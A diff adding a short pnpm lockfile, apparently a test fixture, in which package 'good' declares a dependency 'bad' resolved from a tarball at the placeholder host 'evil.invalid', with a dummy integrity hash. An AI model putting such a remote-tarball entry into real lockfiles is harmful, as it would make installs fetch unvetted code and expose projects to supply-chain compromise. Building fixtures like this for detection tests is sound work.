@@ -1,0 +1,12 @@
+lockfileVersion: '9.0'
+
+packages:
+
+  good@1.0.0:
+    resolution: {integrity: sha512-x}
+
+snapshots:
+
+  good@1.0.0:
+    dependencies:
+      bad: https://evil.invalid/x.tgz
